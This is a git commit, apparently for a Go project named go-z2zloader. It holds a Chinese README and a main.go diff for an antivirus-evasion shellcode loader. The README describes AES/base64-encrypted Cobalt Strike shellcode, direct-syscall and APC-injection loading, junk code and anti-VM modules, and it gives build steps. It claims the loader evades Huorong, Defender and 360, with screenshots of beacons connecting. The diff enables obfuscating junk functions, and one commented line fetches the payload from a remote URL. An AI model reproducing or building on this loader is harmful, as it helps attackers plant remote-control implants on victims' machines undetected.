8b61b82540a66dcfc6dfd209666a1e29c6b83441
z2zQAQ <2947751782@qq.com>
2024-12-27 13:06:41 +0800

    readme

--- README.md
+++ README.md
@@ -1,2 +1,95 @@
 # go-z2zloader
+
 an Anti- Virus demo using go
+
+# 介绍
+
+学习了一段时间go和免杀 做了个小demo，本来计划是cobra库做成工具使用的，但是后来觉得直接编译成exe比较方便，就上传了这个旧的版本。
+
+静态加密使用的是aes+base64
+
+动态直接调用syscal底层函数，挺老的办法没想到还能用，还尝试了APC注入，但是有时候上不了线
+
+加入了junkcode和anti-vm模块，还在测试中
+
+
+
+# 使用
+
+cs stageless生成raw shellcode
+
+![image-20241227124903604](README/image-20241227124903604.png)
+
+```
+首先在main函数中调用encode模块 加密原生shellcode
+然后选择使用本地（Original）还是远程（remote）模块，远程模块也是在开启web服务的目录下放置一个加密后的shellcode
+
+1.不注释第11行，输入原生shellcode加密
+go run main.go 
+2.选择加密模式，输入加密后的bin文件
+go build -ldflags="-s -w" -o 输出exe文件名 main.go
+```
+
+![image-20241227124815484](README/image-20241227124815484.png)
+
+# 免杀效果
+
+加密后的bin文件
+
+![image-20241227115947651](README/image-20241227115947651.png)
+
+生成的exe过火绒 df 360
+
+![image-20241226151645350](README/image-20241226151645350.png)
+
+
+
+![image-20241226161253029](README/image-20241226161253029.png)
+
+
+
+上线
+
+360
+
+![image-20241227112249120](README/image-20241227112249120.png)
+
+![image-20241227112324291](README/image-20241227112324291.png)
+
+核晶
+
+![image-20241227112649282](README/image-20241227112649282.png)
+
+火绒
+
+![image-20241227114234152](README/image-20241227114234152.png)
+
+
+
+exe沙箱结果
+
+![image-20241226162856494](README/image-20241226162856494.png)
+
+
+
+# 后续
+
+APC模块昨天测试的时候会被360杀，今天上线不了了，还在排查原因
+
+添加免杀模块，尝试过沙箱
+
+免黑框
+
+
+
+# 学习资料
+
+[Junk-Go-Generator/Junk Code Generation.go at master · SaturnsVoid/Junk-Go-Generator](https://github.com/SaturnsVoid/Junk-Go-Generator/blob/master/Junk Code Generation.go)
+
+[go实现免杀(实用思路篇) | CN-SEC 中文网](https://cn-sec.com/archives/2839255.html)
+
+[（●´3｀●）好啦好啦](https://shut-td.github.io/CS远控免杀思路与实现/)
+
+[免杀技术 - go shellcode 加载 bypassAV | Hyyrent blog](https://pizz33.github.io/posts/4ac17cb886a9/)
+
+https://github.com/HZzz2/go-shellcode-loader
--- main.go
+++ main.go
@@ -2,165 +2,165 @@ package main
 
 import "shellcode_test/tools"
 
-// junkcode
-// var oVoDjj int = 843729
-// var loupSLOmAVVEKiOcBtXAPh string = `fYGohuhAuiIdKKZzAYVv`
-// var FMfdSkgWnJcowbLmgSg int = 911305
-// var iuBAepGzEXTm string = `ewYnpMxyNLmSVwbY`
-// var LDpJlBiFUepNpmY int = 250036
-// var anEUNlSngKXCBNFB string = `ELTdFHBorusPnPpxRCgTrx`
-// var pSiOsIE = []byte(`QBXbNClUGixxHXd`)
-// var fiPrjVcHNVnzOoqGbiXQc = []byte(`qHqLk`)
-// var sbEElDiVoN = []byte(`CADKZpTOEXAEpCLFonznC`)
-// var YFmKpAYpsVtZYSSRZrlocI bool = false
-// var roWfowsUmascjLRX = []byte(`gdViTIfkAsCEVALjJSnj`)
-// var CzgTasfJQoTJwJzOeIhptts = []byte(`IGqbRTpiYxRpuzGZwty`)
-// var Xiu int = 751567
-// var jaIuUrtEoIvmg int = 962695
-// var LvJgETlaTcGzqpDq int = 104205
-// var HaXKfW string = `wACoPCYcqw`
-// var jtOdcwPsIirsRPNFHkRncUFt string = `WjClmVdJetAIhn`
-// var RzZgwByleGYaHgFmLURP string = `MvJKeNnlx`
-// var WrIygCDqabHClkitklU string = `EBwwNIsHKRYcL`
-// var zeRWPizFEtxS int = 973324
-//
-//	func MMzjjPjbiWdoULvhU() {
-//		var TmuRX string = `FREeqDeqsGoWgg`
-//		var KrQSKJfnWKzfFOaCzWfLGv string = `EvQvfRVM`
-//		if TmuRX == KrQSKJfnWKzfFOaCzWfLGv {
-//		} else {
-//		}
-//	}
-//
-//	func wFqjxka() int {
-//		var YxOYAuxzDFgyhLKTbuWCROgM string = `ChNHhYW`
-//		var ZpCEuUzUXRsXalMO string = `TdSfk`
-//		var TQgByBgJBGTWA int = 658386
-//		if YxOYAuxzDFgyhLKTbuWCROgM == ZpCEuUzUXRsXalMO {
-//			TQgByBgJBGTWA += 333000
-//		} else {
-//			TQgByBgJBGTWA += 941688
-//		}
-//		return TQgByBgJBGTWA
-//	}
-//
-//	func KUwWGwUZl() {
-//		var VodDECPoaESgLRWDO string = `kvndye`
-//		var pGWEBqwVEOuSeDNi string = `sINDooydLuVmjyKHuKujo`
-//		if VodDECPoaESgLRWDO == pGWEBqwVEOuSeDNi {
-//		} else {
-//		}
-//	}
-//
-//	func rPQZcXzaGuXyEbnvHKzNCxvl() int {
-//		var qprdKYQMDpvHvBGlOEuz string = `HADcPYLwDNPpLaeso`
-//		var pvvSWYXxZltxopOmTU string = `uItWJSqXaYXIqjpiCWmeiF`
-//		var mskPdJiVsTNtiWhhLYmv int = 968200
-//		if qprdKYQMDpvHvBGlOEuz == pvvSWYXxZltxopOmTU {
-//			mskPdJiVsTNtiWhhLYmv += 67793
-//		} else {
-//			mskPdJiVsTNtiWhhLYmv += 984904
-//		}
-//		return mskPdJiVsTNtiWhhLYmv
-//	}
-//
-//	func RzJZUWbFgDdPPKxyKk() {
-//		var BdrCjUs string = `ECuozPeIuMXXAO`
-//		var JuBZPwkfDeInrtuiSkc string = `UFNIxALp`
-//		if BdrCjUs == JuBZPwkfDeInrtuiSkc {
-//		} else {
-//		}
-//	}
-//
-//	func bmhmwvuT() int {
-//		var GNSrCUOnr string = `bolXF`
-//		var InztkuqFBl string = `hGWIO`
-//		var kYmnnKfUrPGS int = 6919
-//		if GNSrCUOnr == InztkuqFBl {
-//			kYmnnKfUrPGS += 55650
-//		} else {
-//			kYmnnKfUrPGS += 381664
-//		}
-//		return kYmnnKfUrPGS
-//	}
-//
-//	func OGZBsAWcESdLioO() bool {
-//		var HBmiVmopkhYPbge string = `JTURLwbSTjxiDJF`
-//		var wbvSjIRpqRCz string = `WIhyGeK`
-//		var HMhkVRnqAXGe bool = false
-//		if HBmiVmopkhYPbge == wbvSjIRpqRCz {
-//			HMhkVRnqAXGe = true
-//		} else {
-//			HMhkVRnqAXGe = false
-//		}
-//		return HMhkVRnqAXGe
-//	}
-//
-//	func HvGfMylevnECdIKMrvgtBC() string {
-//		var cbtTuencqqRm string = `MAWwzqUN`
-//		var RucaEZKm string = `zQYQLJApPAZuuvfWGtpgpe`
-//		var GijwGsoCXAISjiOseBsvWfA string = `lEphARmuXrxXAHsaAd`
-//		if cbtTuencqqRm == RucaEZKm {
-//			GijwGsoCXAISjiOseBsvWfA += `cQldlJ`
-//		} else {
-//			GijwGsoCXAISjiOseBsvWfA += `KPoHFtyA`
-//		}
-//		return GijwGsoCXAISjiOseBsvWfA
-//	}
-//
-//	func INFhZn() string {
-//		var YjjQrZsTSvVCVpcOQWy string = `rfzOjMrVuAD`
-//		var vfxNr string = `UOAnglsuWDkZVQVWLJEIu`
-//		var xrIHtHzoowDFxwLHjcon string = `KdRuGcqEngMojwNHcF`
-//		if YjjQrZsTSvVCVpcOQWy == vfxNr {
-//			xrIHtHzoowDFxwLHjcon += `RqhkORpMbTqmshrkswjsJ`
-//		} else {
-//			xrIHtHzoowDFxwLHjcon += `OMzPIj`
-//		}
-//		return xrIHtHzoowDFxwLHjcon
-//	}
-//
-//	func aUhH() {
-//		var uNisfjQDcbOPrYPT string = `qTmnraQAoGpVYgwHMGxZp`
-//		var DxMipNYpuntbn string = `kajuYOGqErrAAHsYk`
-//		if uNisfjQDcbOPrYPT == DxMipNYpuntbn {
-//		} else {
-//		}
-//	}
-//
-//	func OjuFnfclaUbuyxefA() int {
-//		var upauargyt string = `tHdVaQyYIDRbfeiccThzakbj`
-//		var nrf string = `ZrVlRpLmGiGlfqpiDZAUSC`
-//		var eHHqapXzUpVgnYn int = 272158
-//		if upauargyt == nrf {
-//			eHHqapXzUpVgnYn += 194515
-//		} else {
-//			eHHqapXzUpVgnYn += 395555
-//		}
-//		return eHHqapXzUpVgnYn
-//	}
-//
-//	func TsLIT() bool {
-//		var MMlUwzaiCDQlkkwmlAVMSJF string = `anXhqmwvmG`
-//		var qbscMBhbgkAqHnWNyvHia string = `RCRlhgfcsw`
-//		var VUKwmTrAClakkSXDMhbsyIzz bool = true
-//		if MMlUwzaiCDQlkkwmlAVMSJF == qbscMBhbgkAqHnWNyvHia {
-//			VUKwmTrAClakkSXDMhbsyIzz = false
-//		} else {
-//			VUKwmTrAClakkSXDMhbsyIzz = false
-//		}
-//		return VUKwmTrAClakkSXDMhbsyIzz
-//	}
-//
-//	func OuTvHCJFlrwrXYfm() {
-//		var LIFInVvGTuBJBkyJA string = `PSEhdkEGFZOYbEHhyjwvQrk`
-//		var sOpZCVghnpGxLp string = `ggLOMnGXlcwplpeWSSfpYF`
-//		if LIFInVvGTuBJBkyJA == sOpZCVghnpGxLp {
-//		} else {
-//		}
-//	}
+var oVoDjj int = 843729
+var loupSLOmAVVEKiOcBtXAPh string = `fYGohuhAuiIdKKZzAYVv`
+var FMfdSkgWnJcowbLmgSg int = 911305
+var iuBAepGzEXTm string = `ewYnpMxyNLmSVwbY`
+var LDpJlBiFUepNpmY int = 250036
+var anEUNlSngKXCBNFB string = `ELTdFHBorusPnPpxRCgTrx`
+var pSiOsIE = []byte(`QBXbNClUGixxHXd`)
+var fiPrjVcHNVnzOoqGbiXQc = []byte(`qHqLk`)
+var sbEElDiVoN = []byte(`CADKZpTOEXAEpCLFonznC`)
+var YFmKpAYpsVtZYSSRZrlocI bool = false
+var roWfowsUmascjLRX = []byte(`gdViTIfkAsCEVALjJSnj`)
+var CzgTasfJQoTJwJzOeIhptts = []byte(`IGqbRTpiYxRpuzGZwty`)
+var Xiu int = 751567
+var jaIuUrtEoIvmg int = 962695
+var LvJgETlaTcGzqpDq int = 104205
+var HaXKfW string = `wACoPCYcqw`
+var jtOdcwPsIirsRPNFHkRncUFt string = `WjClmVdJetAIhn`
+var RzZgwByleGYaHgFmLURP string = `MvJKeNnlx`
+var WrIygCDqabHClkitklU string = `EBwwNIsHKRYcL`
+var zeRWPizFEtxS int = 973324
+
+func MMzjjPjbiWdoULvhU() {
+	var TmuRX string = `FREeqDeqsGoWgg`
+	var KrQSKJfnWKzfFOaCzWfLGv string = `EvQvfRVM`
+	if TmuRX == KrQSKJfnWKzfFOaCzWfLGv {
+	} else {
+	}
+}
+
+func wFqjxka() int {
+	var YxOYAuxzDFgyhLKTbuWCROgM string = `ChNHhYW`
+	var ZpCEuUzUXRsXalMO string = `TdSfk`
+	var TQgByBgJBGTWA int = 658386
+	if YxOYAuxzDFgyhLKTbuWCROgM == ZpCEuUzUXRsXalMO {
+		TQgByBgJBGTWA += 333000
+	} else {
+		TQgByBgJBGTWA += 941688
+	}
+	return TQgByBgJBGTWA
+}
+
+func KUwWGwUZl() {
+	var VodDECPoaESgLRWDO string = `kvndye`
+	var pGWEBqwVEOuSeDNi string = `sINDooydLuVmjyKHuKujo`
+	if VodDECPoaESgLRWDO == pGWEBqwVEOuSeDNi {
+	} else {
+	}
+}
+
+func rPQZcXzaGuXyEbnvHKzNCxvl() int {
+	var qprdKYQMDpvHvBGlOEuz string = `HADcPYLwDNPpLaeso`
+	var pvvSWYXxZltxopOmTU string = `uItWJSqXaYXIqjpiCWmeiF`
+	var mskPdJiVsTNtiWhhLYmv int = 968200
+	if qprdKYQMDpvHvBGlOEuz == pvvSWYXxZltxopOmTU {
+		mskPdJiVsTNtiWhhLYmv += 67793
+	} else {
+		mskPdJiVsTNtiWhhLYmv += 984904
+	}
+	return mskPdJiVsTNtiWhhLYmv
+}
+
+func RzJZUWbFgDdPPKxyKk() {
+	var BdrCjUs string = `ECuozPeIuMXXAO`
+	var JuBZPwkfDeInrtuiSkc string = `UFNIxALp`
+	if BdrCjUs == JuBZPwkfDeInrtuiSkc {
+	} else {
+	}
+}
+
+func bmhmwvuT() int {
+	var GNSrCUOnr string = `bolXF`
+	var InztkuqFBl string = `hGWIO`
+	var kYmnnKfUrPGS int = 6919
+	if GNSrCUOnr == InztkuqFBl {
+		kYmnnKfUrPGS += 55650
+	} else {
+		kYmnnKfUrPGS += 381664
+	}
+	return kYmnnKfUrPGS
+}
+
+func OGZBsAWcESdLioO() bool {
+	var HBmiVmopkhYPbge string = `JTURLwbSTjxiDJF`
+	var wbvSjIRpqRCz string = `WIhyGeK`
+	var HMhkVRnqAXGe bool = false
+	if HBmiVmopkhYPbge == wbvSjIRpqRCz {
+		HMhkVRnqAXGe = true
+	} else {
+		HMhkVRnqAXGe = false
+	}
+	return HMhkVRnqAXGe
+}
+
+func HvGfMylevnECdIKMrvgtBC() string {
+	var cbtTuencqqRm string = `MAWwzqUN`
+	var RucaEZKm string = `zQYQLJApPAZuuvfWGtpgpe`
+	var GijwGsoCXAISjiOseBsvWfA string = `lEphARmuXrxXAHsaAd`
+	if cbtTuencqqRm == RucaEZKm {
+		GijwGsoCXAISjiOseBsvWfA += `cQldlJ`
+	} else {
+		GijwGsoCXAISjiOseBsvWfA += `KPoHFtyA`
+	}
+	return GijwGsoCXAISjiOseBsvWfA
+}
+
+func INFhZn() string {
+	var YjjQrZsTSvVCVpcOQWy string = `rfzOjMrVuAD`
+	var vfxNr string = `UOAnglsuWDkZVQVWLJEIu`
+	var xrIHtHzoowDFxwLHjcon string = `KdRuGcqEngMojwNHcF`
+	if YjjQrZsTSvVCVpcOQWy == vfxNr {
+		xrIHtHzoowDFxwLHjcon += `RqhkORpMbTqmshrkswjsJ`
+	} else {
+		xrIHtHzoowDFxwLHjcon += `OMzPIj`
+	}
+	return xrIHtHzoowDFxwLHjcon
+}
+
+func aUhH() {
+	var uNisfjQDcbOPrYPT string = `qTmnraQAoGpVYgwHMGxZp`
+	var DxMipNYpuntbn string = `kajuYOGqErrAAHsYk`
+	if uNisfjQDcbOPrYPT == DxMipNYpuntbn {
+	} else {
+	}
+}
+
+func OjuFnfclaUbuyxefA() int {
+	var upauargyt string = `tHdVaQyYIDRbfeiccThzakbj`
+	var nrf string = `ZrVlRpLmGiGlfqpiDZAUSC`
+	var eHHqapXzUpVgnYn int = 272158
+	if upauargyt == nrf {
+		eHHqapXzUpVgnYn += 194515
+	} else {
+		eHHqapXzUpVgnYn += 395555
+	}
+	return eHHqapXzUpVgnYn
+}
+
+func TsLIT() bool {
+	var MMlUwzaiCDQlkkwmlAVMSJF string = `anXhqmwvmG`
+	var qbscMBhbgkAqHnWNyvHia string = `RCRlhgfcsw`
+	var VUKwmTrAClakkSXDMhbsyIzz bool = true
+	if MMlUwzaiCDQlkkwmlAVMSJF == qbscMBhbgkAqHnWNyvHia {
+		VUKwmTrAClakkSXDMhbsyIzz = false
+	} else {
+		VUKwmTrAClakkSXDMhbsyIzz = false
+	}
+	return VUKwmTrAClakkSXDMhbsyIzz
+}
+
+func OuTvHCJFlrwrXYfm() {
+	var LIFInVvGTuBJBkyJA string = `PSEhdkEGFZOYbEHhyjwvQrk`
+	var sOpZCVghnpGxLp string = `ggLOMnGXlcwplpeWSSfpYF`
+	if LIFInVvGTuBJBkyJA == sOpZCVghnpGxLp {
+	} else {
+	}
+}
 func main() {
-	//tools.Encode("E:\\Destop\\test\\payload_x64.bin")
-	tools.APCloader("E:\\mygo\\shellcode_test\\output.bin")
+	tools.Encode("E:\\mygo\\shellcode_test\\beacon.bin")
+	//tools.OriginalLoader("E:\\mygo\\shellcode_test\\output.bin")
 	//tools.Remote_loader("http://192.168.230.129:8080/output.bin")
+	//tools.APCloader("E:\\mygo\\shellcode_test\\output.bin")
 }
